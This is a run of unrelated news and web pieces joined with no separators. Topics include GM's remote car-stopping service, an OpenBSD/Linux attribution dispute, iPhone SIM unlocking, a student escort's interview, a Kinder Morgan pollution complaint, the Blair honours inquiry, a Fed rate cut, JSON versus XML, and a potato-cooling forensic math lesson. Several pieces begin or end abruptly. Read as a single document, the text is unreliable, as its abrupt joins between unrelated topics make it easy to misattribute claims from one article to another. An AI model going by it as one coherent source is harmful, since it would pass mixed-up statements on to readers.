The intent of the system is to cut down on the number of police chases , which can be dangerous for both bystanders and police .
A recent study showed that from 1994 through 2002 , there were 2,654 crashes involving 3,965 vehicles and 3,146 fatalities during police pursuits .
The idea for this capability was showcased recently in science fiction author Greg Bear 's book Quantico .
In the novel , a near - future story about biotech and the war on terror , police could use Cop Block to stop a car or truck in its tracks .
" ... When the truck 's driver ignored his lights and siren and the trucks failed to respond to Cop Block , the patrolman became aware he might have a situation ... "
All cars and trucks in the U.S. were now required to have Cop Block .
A patrol car could radio a coded signal that slowed and then shut down the engine .
( Read more about Cop Block )
GM also stated that the owner of the vehicle may opt out of the service upon request .
GM 's research has indicated that 95 % of current OnStar subscribers would like to participate .
Take a look at other initiatives to make the roads safer , like the prototype car seat and Nissan Pivo 2 in - dash robot , which try to detect drivers sleeping behind the wheel .

The case of the unwelcome attribution
This article brought to you by LWN subscribers Subscribers to LWN .
net made this article — and everything that surrounds it — possible .
If you appreciate our content , please buy a subscription and make the next set of articles possible .
A couple of weeks ago , LWN examined the dispute with the OpenBSD project over the copyright notices placed in ( and removed from ) the versions of the Atheros wireless network driver intended for eventual merging into the mainline Linux kernel .
At that time , the files with the improperly removed license text had never made it anywhere near the mainline repository and an effort was being made to fix the problem .
It really seemed like the whole issue should end then .
So why does a perusal of the OpenBSD lists ( and , often , unfortunately , linux - kernel as well ) turn up gems like these ?
The rights and recognition of one of our own developers ( reyk@ ) have been molested , and all we 've done as a community is to participate in useless flames and blog postings .
Theo has thrown himself , once again , against the spears of the Linux community and their legal vultures in order to protect our software freedoms .
How many of us can say we 've done our part to defend truly Free Software ?
-- Jason Dixon
In the case of Ryek 's [ sic ] code , the reverse is true but instead of admitting the mistake and making the needed corrections , FSF has pulled out their lawyers in hopes of getting away with the theft .
All of this is being done * intentionally * in hopes that no one will put up a fight .
-- J.C. Roberts
I am really disappointed by all this .
I would have expected that once such a patch is suggested ( let alone being committed to some public place ) some senior / respected / responsible Linux person would tell them what they are doing is wrong .
Right from the start .
I now see this is not how things work around here .
-- Can E. Acar
One might well think that the whole issue is still open .
In fact , much of the dispute has gone by the wayside .
The files with the improperly removed copyright notices never were going to make it to the mainline .
The allegations by Theo de Raadt that taking a dual - license notice at its word was illegal have been pretty well laughed off ; the OpenBSD camp is no longer asserting that claim .
In fact , there is really only one point of dispute left :
The OpenBSD developers do not believe that developers Nick Kossifidis and Jiri Slaby should have added their own copyright attributions to the file ath5 k_hw.c .
Those two developers , it is claimed , have not done enough work on that file to have earned any copyright claims there .
For this offense , the OpenBSD community continues to flame , threaten lawsuits , and more .
It seems that the developers named above should simply add some original haiku to the opening comments so that their right to claim copyright to portions of the file would be indisputable .
Even in the absence of bad poetry , these developers have done some small amount of work and will certainly do more to get the code ready for Linux inclusion .
Threatening legal action as a way of keeping them from adding their own attribution to the file seems gratuitous .
Part of what is going on here may be a simple culture clash .
It seems that , in the BSD world , the adding of a copyright attribution to a file is usually done with the permission of the existing copyright holders .
For a developer to just patch an attribution can come across as being a bit rude .
In the Linux community , instead , developers simply add a copyright if they feel they have done enough work to justify it .
It is hard to come up with cases where these attributions have gone in without merit .
Eben Moglen 's one public contribution to this conversation includes this paragraph :
We understand that attribution issues are critically important to free software developers ; we are accustomed to the strong feelings that are involved in such situations .
In the fifteen years I have spent giving free legal help to developers throughout the community , attribution disputes have been , always , the most emotionally charged .
That is clearly what is going on here - this discussion is certainly happening on a strongly emotional level .
But it must be said that the most harsh language seems to be flowing in one direction : from OpenBSD toward Linux .
This was also true when the situation was reversed and an OpenBSD developer was found to have improperly relicensed some Linux code .
In both cases ( and in others ) there is a clear sense that the OpenBSD people feel wronged by Linux .
One might well wonder why this is the case .
To an extent , OpenBSD developers may be following the tone set by that project 's leader .
They may be irritated by the licensing asymmetry : BSD - licensed code can be incorporated into a GPL - licensed project , but GPL - licensed code cannot be brought into a BSD - licensed project .
Or perhaps they feel that their system has been unfairly upstaged by an inferior rival .
Whatever the reason , there is a certain hostility emanating from that camp which is unpleasant to see .
It would be a mistake , however , to let the public flaming obscure the fact that Linux and the BSD variants have much in common .
There is certainly no shortage of Linux proponents whose " advocacy " makes our community look bad .
BSD will have people like that too .
Meanwhile , behind the scenes , there is a great deal of good will , information , and code which flows in both directions .
We are all working toward the same ends , and there are plenty of places where we can learn from the BSD communities .
This incident will pass , and hot heads will cool - before , undoubtedly , heating up again on a different topic - but , through it all , free software will just continue to get better .
In today ’s fast paced , highly competitive job market where first impressions are the fine line between success and failure , you must be keenly aware of your online image .
Bear in mind that a rising number of human resource recruiters are using Google when gathering information on potential employees .
The necessity to maintain a clean online image should be common sense .
We all know that posting photos of ourselves dancing on bar tops and / or partaking in acts radicalism probably wo n’t help our image in the eyes of an employer .
With these points in mind , being anonymous on Google might sound like a safe bet .
But what really happens if a Google search for your name comes back blank ?
If an employer searches Google for your name and absolutely no results are returned , are you really any better off ?
The answer may be no .
A mid-2006 market analysis by career search firm ExecuNet reported that 77 % of the job recruiters claim they use search engines as a primary tool to research potential employees .
It seems quite probable that this percentage has increased drastically in the last year .
If Google ca n’t locate a single webpage that references you , how much of an impact could you have possibly made in your career ?
If you have a tech based career it paints an even darker picture of your past performance .
Having your own web presence says something about your contributions to the market itself .
Even if your presence is derived from short intelligent comments left on professional forums , it shows that you are actively involved and aware of what is going on .
The best defense against being Google anonymous is a good offense .
Be proactive .
Create a web presence that you are proud to identify with .
When you set out to build this presence , use your real name if you want people to find you .
Here are 3 ideas to get you started :
1. Create a Blog – Blogger Adam Darowski suggests that the blog is the new resume .
If executed properly , it could be even better than a resume .
It is a true representation of who you are , spoken freely in your own words .
Your blog has the power to completely influence someone ’s opinion about you .
It satisfies the curiosity of any entity , especially potential employers , which might Google you to see what kind of person you are .
The key is to show them your best , but remain truthful while doing so .
Truth is the key to success for any blogger .
You can create a free blog using one of the following sites : WordPress.com Blogger.com LiveJournal.com
2. Create a Personal Website – Popular domain sellers like GoDaddy and Yahoo Small - Business have simple step - by - step webpage creation tools that allow non-techie users to setup attractive websites .
A website is designed to be more static than a blog , so you are not expected to update it as often .
It could be used as a professional web portfolio by including your resume , professional works , career summaries , goals , etc .
Get started with a personal website : GoDaddy Yahoo Small - Business
3. Use Professional Networking Sites – Professional social networking sites such as LinkedIn and Ziggs can also assist you in establishing a respectable online presence that will be searchable via Google .
Both sites allow you to build an online profile , associate it with past employers , and network with professional contacts .
Get started with professional social networking : LinkedIn Ziggs
Just remember , if you do n’t exist to Google , you may not exist at all .
Apple will actively work against any SIM unlocks of the iPhone , says Apple CEO Steve Jobs .
Jobs made the comments during a Q&A session that took place after yesterday 's press event in London announcing availability details of the iPhone in the UK .
When asked by a journalist whether unlocking was a concern for the company , Jobs said , " It 's a constant cat and mouse game , " according to ComputerWorld 's account of the discussion .
" We try to stay ahead .
People will try to break in , and it's our job to stop them breaking in . "
The break - ins that Jobs spoke of have been flying fast and furious in the last month or so .
One of the first full SIM unlocks involved using a Turbo SIM card , a somewhat complex process for the average consumer .
Then teenager George Holtz published a way to hardware unlock his iPhone with some soldering iron - fu and released instructions for other adventurous unlockers .
But none of this was " big " news to the world until the first ( commercial ) software unlock of the iPhone was announced by iPhoneSIMfree .
This sent waves through the iPhone community to push for a free unlock from the iPhone Dev Team , which was achieved just this week with the release of iUnlock , followed by the GUI app to go along with it , anySIM .
This app began to appear in the third - party iPhone software update app , Installer , which enabled many iPhone users to install the unlock and experiment with ease .
Hacking is okay ... sometimes
Apple 's stance on stopping hackers is different depending on the hack .
When it came to hacking the Apple TV and introducing the first set of native iPhone applications — something that cannot be done the " legit " way because of Apple 's lack of a formal SDK for developers — Apple took a neutral stance .
Apple 's Greg Joswiak said last week that Apple would n't stop anyone from writing the apps or actively work against them , but the company would also not make an effort not to break the hacks when releasing its own software updates .
After all , the hacks are not officially supported .
But when it comes to SIM unlocking the iPhone , the game changes drastically .
Although Apple has less to lose by customers unlocking the device than AT&T , the company is bound by its contract to AT&T to do what it can to ensure that customers use the designated carrier .
And Apple does have something to lose — the company is widely known to be getting a cut of subscription fees from AT&T for each person that buys and uses an iPhone .
While it 's unclear exactly how much Apple gets per customer , analyst estimates amount to millions of dollars per year in subscription fees going directly to Apple .
Apple 's contractual obligations aside , consumers in the US are legally allowed to unlock their mobile handsets after the US Register of Copyrights approved an exemption to the DMCA late last year , noting that " The underlying activity sought to be performed by the owner of the handset is to allow the handset to do what it was manufactured to do — lawfully connect to any carrier . "
But do n't tell that to Apple and AT&T — unless the government bars them from locking out the unlocks , there 's virtually nothing stopping them from making sure that the unlocks mysteriously stop working .
A very expensive brick
But we have reason to believe that Apple may go much further than just " breaking " the SIM unlocks that have been released so far .
One move that the cat ( or is Apple the mouse ? ) could make in this game would be to permanently and irreparably brick unlocked iPhones when they run this month 's pending software update .
It would serve as a warning shot to potential unlockers in the future — even if crafty hackers manage to rewrite their unlock apps to get around the changes made in the update , they could always be at risk of suddenly owning a shiny $ 400 chunk of metal and plastic .
We believe this is a significant possibility , so here 's a word for those who have unlocked their iPhones : be extremely careful when the software update lands ; let others be the guinea pigs before you run it .
A software restore of the iPhone likely wo n't save you , either , as the radio baseband firmware used to identify the SIM card will still remain unlocked ( as it stands now , those who have run unlocks can still do a software restore and have an unlocked iPhone ) .
And if Apple writes its update to make changes to the radio baseband firmware based on what it was expecting , the iPhone will not react well .
Welcome to your new iBrick Extreme : the new paperweight from Apple .
Living on a £ 1,000 overdraft , Sarah is struggling to finish her business studies degree , so three nights a week she becomes " Mandy " , a female escort .
Here she reveals all …
" Escorting was just something I fell into , " she says .
" I saw an advert in the local newspaper , knew my bank balance was looking seriously unhealthy and - thinking about the student fees hanging over my head - decided to give them a call . "
Selling sex is a quick and easy way to make cash .
In London alone , some 80,000 men are thought to regularly pay for sex .
" I 'd rather get paid £ 50 per hour for doing something that is not difficult rather than work 30 hours a week in a bar for £ 4 an hour , " Sarah says .
" A lot of my friends are unhappy with their jobs but I am happy with mine .
If I work three hours a week for a year I 'll earn nearly £ 8,000 and have more time to study .
What 's wrong with that ? " she asks .
" I must admit my first night was terrifying .
I could hardly stand up I was shaking so much .
You wait for your jobs in the ' girls ' lounge ' , which is a pokey room with just a couple of sofas , a television and five overflowing ashtrays .
" There are no windows .
The only light comes from a dim lamp in the corner of the room .
The smell is a mixture of stale smoke and perfume .
It 's not the best place to prepare yourself for the unknown , but it 's better than being the street , " she reasons .
Indeed , studies show women who work on the street are 10 times more likely to face violence than those who work for escort agencies .
" The agency promised I would only be sent out to a regular client who they knew well , " she continues , " which put my mind at rest a little .
It seemed like I was waiting for an eternity before my name was finally called though .
" I had to ring the client personally to give him a brief description of myself .
After I anxiously dialled the number , a man answered in a soft Irish accent .
" ' Hi , my name 's Mandy , ' I said .
' I understand you are looking for some company this evening .
Would you like me to describe myself ?'
" Yes , " he replied .
" ' Well , I 'm 5 ' 5 with long brown hair , blue eyes , slim with an attractive face and I'm a 32C .
" ' Would you be interested in seeing me this evening ? '
I asked .
" Yes , " he said , and we finalised the arrangements .
" I must have said all that without taking a breath as my heart was racing when I put the phone down , " Sarah explains .
" Next thing I knew the driver had arrived to pick me up .
The journey lasted about 40 minutes .
I had no idea where I was .
" When I arrived , the client offered me a drink which I accepted .
He was an older man and must have been at least in his mid-50s .
He was very chatty and tried his best to make me feel comfortable .
" We talked about all sorts of things from his family to my studies .
He seemed to take a real interest .
We chatted for the whole of the first hour and he asked if I could stay a bit longer .
I phoned the agency to check and they said it was fine .
" We chatted some more .
I was still nervous but felt a little more relaxed than when I had first arrived .
Then - about 20 minutes before the second hour was up - he asked me for a massage .
I knew I could n't put off the inevitable any longer .
" We went into his bedroom and I just switched off .
I honestly do n't remember much .
We had sex , it did n't last long .
In all I spent three hours with him , earning myself £ 150 plus a £ 50 tip .
" I came away thinking : ' That was n't too bad … I could do this ' .
Of course , the money was the thing that made me continue .
Two hundred pounds for just three hours work definitely is n't bad work for a student ! "
Some of Sarah 's clients are more interested in her company than her body and she often finds herself just sitting and talking without having to perform sex .
" You meet all types of men from the young and shy to older , more experienced and richer clients , " she says .
" One of my regulars is a man in his late 30s .
He is unmarried and does n't have children .
I always spend about three hours with him and for the whole time we just sit and watch Star Trek .
" He gets dressed up in the costumes and I just sit and watch the programmes with him .
At first , I thought it was all very bizarre but the more time I spent with him the more I realised that he 's lonely , maybe a little odd , but just desperately needing female company . "
The worst types of clients , Sarah says , are the drunk , abusive ones .
" They can become a bit too enthusiastic sometimes .
But half of them just end up passing out after about 15 minutes ! " she says .
" The girls I work with are all very similar to me .
There are a few that have got into hard drugs but the rest just really need money .
We have a good laugh swapping stories and advice and feel relaxed as none of us are judging each other . "
The demands on each girl and what they must do to continue being ' looked after ' by their agencies differ from place to place .
No agencies are allowed to openly offer any customers sex on a commercial basis .
Escort agencies can even get a licence if they state they are not offering sexual services .
Not every escort agency offers sex but , after investigation , it appears the majority of them use at least some women who do .
" The agency does n't expect much from the girls , " Sarah says .
" There are a few rules as there are with any job but most of them are for our own safety .
You have to work at least two nights a week , and one of those nights has to be either a Friday or Saturday evening .
" You must always get the money up - front before anything happens and you must gain regular clients or risk being thrown out .
You must always also have your " kit " with you whenever you go out on a job , " Sarah explains .
" It consists of condoms , lubricant , massage oil , a mobile phone , a pair of stockings and a card with your name and availability on it .
" The agency also encourages you to ' invest ' in kinky underwear , bondage equipment and sex toys .
It 's up to you , it 's not a must .
But they say you ’re more likely to get work if you 're open to ideas . "
Safety , Sarah says , is paramount both personally and within the agency 's own code of practice .
" Everything I do is very safe , " she explains .
" Clients are checked out and we call the agency when we arrive and when we leave so they know we are alright .
" I have a driver who takes me to each job and waits outside for me to finish , so if there is any real trouble they 're never far away to come in and get you , which is always reassuring .
" Once I 'm there , I do n't do anything without a condom except say ' Hello ' .
Of course , no woman wants to have sex with a man she does n't know but the condom is always there between him and me , and I just switch off and think about what I 'm going to be doing afterwards .
" The condom could be attached to a chest of drawers for all the difference it makes to me most of the time !
To the man , it 's like a blind date with the sexual uncertainty removed , Sarah says .
" If a man spends an evening in a nightclub chatting up a girl , he does n't know whether he 's going to get what he wants .
But this way he knows sex is guaranteed and if he 's married , he can eliminate a certain amount of risk . "
Looking to the future , Sarah 's intentions are to complete her studies and gain employment in the business world .
Going back is always an option if things do n't work out because she has never experienced anything to make her think twice about working in the sex industry .
" I have never had a really bad experience .
I 'm sure if I had , I would n't still be working as an escort .
Of course , I hear some of the bad experiences the girls have been through , " she says .
" But until something bad actually happens to me , I wo n't stop doing it . "
The worst thing about ' doing jobs ' is the smell afterwards , Sarah says .
" I can always smell the men on me but that ’s nothing a long , hot shower ca n’t get rid of .
" None of my friends or family know what I really do .
They think I work nights at a call centre .
I do n't flash my money around , it all goes on student fees and rent and the rest I put in a savings account so no - one asks questions . "
Sarah admits she would be ashamed if anyone found out .
" There is always a risk that one day I will turn up at a job and be faced with someone I know , " she says .
" I have never actually been taken out to dinner with a client in public .
It has always been home visits .
I 'm not complaining , but sometimes it would be nice to be treated to a good meal ! "
Sarah 's outlook is realistic as opposed to self - serving .
" I am not a victim , but I am not planning on making a career out of it either , " she says , staring out the window .
" If I do n't get funding for my MA , I 'll keep it up and after that , if my wages are n't good , I 'll think about doing it again . "
" Contrary to what most people imagine , female escorts are n't all girls who have a drug habit to feed or three young kids in care , " the pretty 20 - year - old student explains .
" They are perfectly ' normal ' people too . "
The videos clearly show large amounts of coal and cement going directly into the water and also shows the fine dust released which travels for miles and covers all in its reach .
I live on my sailboat next door to the facility and have always just washed the mess off and lived with the nuisance .
When I learned of the plan to more than triple the size of the operation I became more active in my opposition and after hearing Kinder Morgans claims I decided to document what I have been observing that directly contradict their claims .
I believe that because of these and other efforts by many others the permit has been delayed .
Kinder Morgan is not happy with the delay or my videos so they decided to call upon Homeland Security to silence their critics .
This resulted in an armed raid and a no warrant search of my boat ( home ) and myself .
My video tape and digital camera footage was viewed .
Charleston City Paper has a good article written by Stratton Lawrence at this link :
Calling out Kinder Morgan 's polluting habits earns one man a visit from Homeland Security
When Homeland Security becomes a tool of the corporations to be used against US citizens to silence them we are truly up shit creek without a paddle .
The particular task force used was called Project Sea Hawk and is a pilot project under consideration for expansion nationwide .
I believe after 30 or so million dollars their claim to fame is catching 30 illegal immigrants building a bridge and me taking pictures .
Charleston - based SeaHawk task force the first in U.S. to focus on cargo terror threat
Project Sea Hawk
My repeated requests for a police report or investigation into who called in a suspicious person report have been met with silence .
Kinder Morgan was well aware of who and why they were being filmed and used Homeland Security to try and make the problem go away .
Did n't work .

Mr Blair has resigned as an MP to become a Middle East envoy
Mr Blair , who left Downing Street on Wednesday , had already become the first PM to be interviewed by police in the course of a corruption inquiry .
Prosecutors had asked Scotland Yard to carry out further inquiries before deciding if charges should be brought .
Those questioned so far , including two of Mr Blair 's aides , deny wrongdoing .
A spokesman at Scotland Yard said the Metropolitan Police was " not prepared to discuss " the inquiry , which has already seen at least 136 people being interviewed .
And a spokesman for Mr Blair refused to confirm or deny the latest development .
Inquiry widened
On Tuesday morning the then prime minister 's official spokesman was asked by BBC News website if there had been any further contact between the police and the prime minister and he replied his previous answers " had not changed " .
According to the Evening Standard newspaper , however , the prime minister had been interviewed for the third time about three weeks previously .
The second time Mr Blair was interviewed , the spokesman explained he had not told journalists because he had not been informed himself .
Earlier this month , No 10 fundraiser Lord Levy and Ruth Turner , who worked in Downing Street , were re-bailed by police .
Both of them had been arrested and questioned as part of a year - long investigation which was , at first , checking if honours had been " sold " .
This was because after secret loans were made to Labour ahead of the 2005 general election , it emerged that some lenders had gone on to be nominated for peerages .
However , it was then widened to look into any attempt to cover up certain activities , and also went on to cover the other main parties .
Mr Blair was then questioned twice as a potential witness .
There have been two other arrests during the inquiry , with Labour donor Sir Christopher Evans re-bailed earlier this month , and head teacher Des Smith informed that he would not be charged .
No -one has been charged with any offences and have all consistently denied any wrongdoing .
Bush team 's Iraq ambassador briefs Washington Post editors and reporters on Iran Nick Juliano
Published : Thursday September 13 , 2007

The top US diplomat in Iraq sat down with the Washington Post Wednesday to push the Bush administration 's case that harsher action needs to be taken against Iran because of allegations that country 's leaders are funding and training militants in Iraq .
Ambassador Ryan C. Crocker , coming off two days of congressional testimony , told the Post that the administration was building support for a third United Nations resolution that would impose harsher sanctions against Iran .
He accused Tehran of pursuing a " fairly aggressive strategy " on the ground in Iraq , according to the Post .
" We know what you 're doing in Iraq .
It needs to stop , " Crocker told his Iranian counterpart in Baghdad , he said in the Post interview .
Next week , the United States will invite officials from Russia , China , France , Britain and Germany to discuss measures in a new UN resolution aimed at punishing Iran after its government has refused to suspend uranium enrichment .
However , some of those countries have resisted sweeping new efforts to punish Iran , diplomats familiar with the debate told the Post .
Reports emerged Wednesday that Germany 's unwillingness to back new sanctions in particular has pushed Washington to develop broader plans for a military strike against Iran .
A State Department spokesman , Sean McCormack , denied that Germany was n't behind the plan for wider sanctions , although he told reporters Wednesday that specifics of a UN sanctions resolutions have not been finalized .
McCormack offered few details about what such a resolution would entail , but he did raise the possibility of the United States unilaterally pursuing economic sanctions .
Crocker 's sit - down with Post editors and reporters appears to be the latest step in what is emerging as a coordinated push against Tehran .
The ambassador spent Monday and Tuesday testifying in front of four House and Senate committees alongside Army Gen. David Petraeus , the commander of US forces in Iraq .
The two officials invoked the Iranian threat in Iraq dozens of times in their testimony , which was meant to provide Congress with a progress report on President Bush 's troop surge earlier this year .
They said Iran would " fill the vacuum " in Iraq if the US withdraws its troops , echoing a line advanced by others in the administration , including Secretary of State Condoleezza Rice .
Attempts to link Tehran to improvised explosive devices -- specifically those known as explosively formed projectiles -- appears to be the manifestation of a US strategy RAW STORY exposed last month to build support for military action against Iran .
Officials have offered some evidence that Iran is meddling in Iraq .
Petraeus said at a press conference Wednesday that Iranians were providing 240 mm rockets to Shia militias , and he said the US had recovered from Iranian fighters items from the wallet of a US soldier who was captured and killed in Karblala , Iraq .
However , the general denied that recently stepped up rhetoric was meant to lay the groundwork for an invasion .
" Certainly not , " Petraeus said .
Where would a good prostitute be without her ( or his ) signature platform shoes ?
In trouble , that 's where .
The Aphrodite projects has taken steps to protect street - walkers with Platforms .
The shoes have a built in audible alarm to scare off attackers , and when the alarm is triggered , the prostitute 's position is transmitted to either the police ( in places where prostitution is legal ) or to sex worker 's rights groups .
The GPS unit uses APRS ( Automatic Packet Reporting System ) a system which uses amateur radio frequencies to send data , which , ironically , was first developed at the United States Naval Academy ( all the nice girls love a sailor ) .
The shoes are a concept right now , albeit a working one , and can be tried out at the Gallery Aferro in Newark , New Jersey in September ( 15th , 22nd , and 29th ) .
Mens and women 's sizes will be available , and orders will be taken for custom builds .
Us ?
We 're just waiting for the GPS / Google Maps mashup to help with our kerb - crawling habit .

What the Fed Decision Means for You How the Fed 's rate decision impacts credit cards , mortgages and student loans .
Sept. 18 , 2007  --
Today 's large interest rate cut by the Federal Reserve made Wall Street giddy , but even those without money in the market have reason to celebrate .
Most people on Wall Street had been expecting a rate cut by the central bank but were pleasantly surprised when the Fed cut rates by half a point instead of the expected quarter point .
This was the first time since June 2003 that the Fed cut its federal funds rate , the interest rate that banks charge each other .
The last half - point cut came in November 2002 .
The Dow Jones industrial average , which was up by 84 points right before the announcement , soared after the 2:15 p.m. announcement , ending the day up 336 points .
Investors loved the rate cut from 5.25 percent to 4.75 percent because cheaper loans mean more borrowing and spending by consumers and businesses alike .
With lower rates , businesses find it easier to expand .
So what about consumers ?
Most people borrow money at the prime rate , which is generally three percentage points higher than the federal funds rate .
Longer - term , fixed rate loans such as mortgages and college student loans are tied to Treasury bonds , which are not directly affected by the Fed 's decision .
So do n't expect any immediate relief .
However , Treasury bonds typically take on some of the federal funds rate momentum and are likely to move down after this decision .
That means people with some types of variable rate mortgages are likely to see some well - needed relief .
It might not be enough to stop the sharp rise in foreclosures , but it is likely to help some of the people on the edge of making their payments .
Some people with an outstanding credit card balance are likely to see some relief , but not immediately .
Variable - rate credit cards are set using a formula tied to the prime rate , but most variable - rate cards do n't " float . "
They shift at fixed times throughout the year , so it 's unlikely there would be a substantial immediate impact .
Also , fixed - rate cards make up the majority of the credit card market and they do n't change much at all .
Also directly affected are people who have home equity lines of credit .
These loans are usually tied to the prime rate so they will be directly impacted .
Finally , people with car loans are not going to see any relief because those rates are typically locked in at the time of the purchase .
However , anybody seeking a new loan for a car purchase will likely see lower rates .
The key for any consumer is to shop around and read the fine print .
So if your credit card rate does n't lower , shop around -- maybe another bank has lowered their rates to be competitive .
RAMALLAH , West Bank , Aug. 2 — Secretary of State Condoleezza Rice , embracing an appointed Palestinian prime minister here in the West Bank , said Thursday that the United States still supported democracy in the Middle East .
But she defended the American refusal to recognize the earlier , elected , Hamas - led government .
Standing next to Mahmoud Abbas , the Palestinian president , during a news conference here , Ms. Rice said , “ We believe strongly in the right of people to express themselves and their desires , in elections . ”
But , she added , once elected , “ you have the obligation to govern responsibly . ”
She said that the United States and other Western nations had been right to boycott Hamas and the elected Palestinian government .
“ You ca n’t have one foot in the path of terror and one foot in the path of politics , ” she added .
Ms. Rice met with Salam Fayyad , the prime minister selected by Mr. Abbas after he ousted the Hamas - led government .
Joel Spolsky has an seminal article entitled Do n't Let Architecture Astronauts Scare
You where he wrote
A recent example illustrates this .
Your typical architecture astronaut will take a fact like " Napster is a peer - to - peer service for downloading music " and ignore everything but the architecture , thinking it 's interesting because it 's peer to peer , completely missing the point that it 's interesting because you can type the name of a song and listen to it right away .
All they 'll talk about is peer - to - peer this , that , and the other thing .
Suddenly you have peer - to - peer conferences , peer - to - peer venture capital funds , and even peer - to - peer backlash with the imbecile business journalists dripping with glee as they copy each other 's stories : " Peer To Peer : Dead ! "
The Architecture Astronauts will say things like : " Can you imagine a program like Napster where you can download anything , not just songs ? "
Then they 'll build applications like Groove that they think are more general than Napster , but which seem to have neglected that wee little feature that lets you type the name of a song and then listen to it -- the feature we wanted in the first place .
Talk about missing the point .
If Napster was n't peer - to - peer but it did let you type the name of a song and then listen to it , it would have been just as popular .
This article is relevant because I recently wrote a series of posts explaining why Web developers have begun to favor JSON over XML in Web Services .
My motivation for writing this article were conversations I 'd had with former co-workers who seemed intent on " abstracting " the discussion and comparing whether JSON was a better data format than XML in all the cases that XML is used today instead of understanding the context in which JSON has become popular .
In the past two weeks , I 've seen three different posts from various XML heavy hitters committing this very sin
JSON and XML by Tim Bray -
This kicked it off and starts off by firing some easily refutable allegations about the extensibility and unicode capabilities of JSON as a general data transfer format .
Tim Bray on JSON and XML by Don Box - Refutes the allegations by Tim Bray above but still misses the point .
All markup ends up looking like XML by David Megginson - argues that XML is just like JSON except with the former we use angle brackets and in the latter we use curly braces + square brackets .
Thus they are " Turing " equivalent .
Academically interesting but not terribly useful information if you are a Web developer trying to get things done .
This is my plea to you , if you are an XML guru and you are n't sure why JSON seems to have come out of nowhere to threaten your precious XML , go read JSON vs. XML : Browser Security Model and JSON vs. XML : Browser Programming
Models then let 's have the discussion .
If you 're too busy to read them , here 's the executive summary .
JSON is a better fit for Web services that power Web mashups and AJAX widgets due to the fact it gets around the cross domain limitations put in place by browsers that hamper XMLHttpRequest and that it is essentially serialized Javascript objects which makes it fit better client side scripting which is primarily done in Javascript .
That 's it .
XML will never fit the bill as well for these scenarios without changes to the existing browser ecosystem which I doubt are forthcoming anytime soon .
Update : See comments by David Megginson and Steve Marx below .
At his session at this year 's GameCity event in Nottingham , England , Frontier Developments founder and Elite co-creator David Braben told his audience that it would be storytelling that would move the games industry into higher regard as a viable mainstream media .
Braben then used examples from his forthcoming title The Outsider to show how the studio hopes to draw players in with a new approach to the problem .
Games , claims Braben , continue to be classed as a second tier of the entertainment industry , under films , books and TV and alongside " action figures and cuddly toys . "
" The games industry is really sneered at , " he said .
" Look at the way politicians cozy up to the film industry , and then compare that to how they treat games .
It 's quite clear they have no respect for the games industry . "
Illustrating the point , Braben flashed a quote from Conservative MP Boris Johnson , saying that under games ' influence , " kids become like blinking lizards , motionless , absorbed , only the twitching of their hands showing they are still conscious . "
Just as other , earlier , forms of entertainment from books to films have suffered similar pessimism in their infancy , especially in the latter case it was story that drove the medium into true credibility , Braben contended , and said that with this generation -- the fifth generation of computing -- it 's time for the Hictchcocks and the Welles to move the industry forward .
While graphics and computing power have increased exponentially , Braben says the fifth generation still has yet to actually be embraced , and there 's a " fantastic opportunity " to do so in creating true empathy , emotion and emergence in games .
Focusing on the former two , Braben says that there 's a different way through the ' uncanny valley ' problem , adding that he absolutely does n't think it means realism , it 's whether the emotional connection is realistic .
With that , he turned to a quick demonstration of how he is tackling the issues with Frontier 's The Outsider , where the game begins with the main character being accused of murdering the president .
From there , the player can influence and play off of a number of rival factions from the media to the Chinese secret service , to U.S. - led " terrorist " resistance organizations , to your own employers , a branch of the CIA that you soon learn are essentially corrupt .
The game itself , Braben explains , does n't use the standard branched - path storytelling , but rather an infinitely more malleable system in which factional character AI chews through a formula of possible actions and outcomes and acts out more contextual and emergent behaviors .
The player influences those behaviors through a conversational system that , too , is contextual .
" Dialogue trees totally kill the experience for me , " he said , with players getting taken out of the action to pause and read through things you might be able to say .
Braben showed a short segment of the game in which a policeman bursts through a door to discover the player and immediately shouts at the fugitive main character to freeze for an arrest .
At the same time , a rival faction comes in through another point in the room and pins both down with gun fire .
Using the contextual system , which gives players a quick choice of words snippets and phrases , Braben convinced the policeman to help fight the rival group .
Now , because the encounter has made him friendlier with the police , they might , in later sections of the game , be persuaded to let the character slip by , or help him chase down other fleeing enemies .
Combined with other proprietary synthesized animation systems alongside traditional motion capture , which can be shared across any in - game character providing " striking variation " in NPCs , Braben says the result is a vast increase in believable behavior , and characters that bring out far more empathy from the player .
The problem , admits Braben , is that though the studio is getting interesting emergent behaviors , it 's also getting some behaviors " we do n't like , " but says it 's also seeing beheaviors " a lot more natural , like threatening a character 's friend . "
Braben concluded by telling the primarily younger audience that " the time to get into the industry now ...
Now we have the opportunity to move out of our niche . "
" This is an industry just getting to the start of a really exciting period , " he said .
" We have a much more interesting medium for getting a story across . "
DEAD BODY MATH
by Dee Heintzen
Covington High School
adapted from William Dunham�s book , � The Mathematical Universe � I recommend reading Dunham�s book as a source of inspiration for writing lesson plans .
This lesson plan is an effort to incorporate more real - life math into the curriculum and find topics that might interest the student , show them a reason to study math and give them an opportunity to use available technology .
This lesson explores the math used in forensic science , looks at Newton�s Law of Cooling , reviews exponential functions , requires modeling techniques , and makes good use of graphing calculators .
The demonstration involves a cooling baked potato ( Mr. potato head ) acting as the dead body , and a detective ( student ) who is trying to determine the time of death .
Objective : Students will see how exponential functions can be used by a detective .
Students will gain practice in accumulating data , modeling and using functions .
Students are then given a bit more information about Euler�s number �e� and exponential functions so that they can improve their best fit equation .
A review of natural logarithms may be necessary .
--------------------------------------------------------------------------------------------------------------------------
Student Worksheet
Scenario : Mr. Potato Head was found dead in his apartment around midnight .
He died sometime during the night .
When a �person� dies , their body temperature begins to cool .
The student ( detective ) needs to determine the time of death .
Procedure : Accumulate data using a Celsius thermometer and a watch , or a CBL unit and temperature probe and graphing calculator .
Start by noting the air temperature in the classroom and the �body � temperature at approximately 5 minute intervals as the potato cools .
A table of values should be recorded showing body ( potato ) temperature and time converted to hours .
When these values are graphed , begin determining the equation of the graph .
Graph your data and attempt to derive an equation that best fits the data and be ready to justify your equation .
Using the trace or table features of your graphing calculator , estimate the time of death .
Your best equation : Estimated time of death :
Although this equation may not be the best equation this is an important part of modeling and can give a good estimate of time of death .
Newton�s Law of Cooling states that the rate at which an object cools is proportional to the difference between the object�s temperature and the temperature of its surroundings .
In other words when there is a big difference between the temperatures of the surrounding air and the body , the body cools rapidly .
A small difference in the two temperatures causes a slower rate of cooling .
Temperature of the body at a certain time , T(0 ) = initial air temperature +
( Difference in body and air temperatures at T ( 0 ) divided by e^( rt ) )
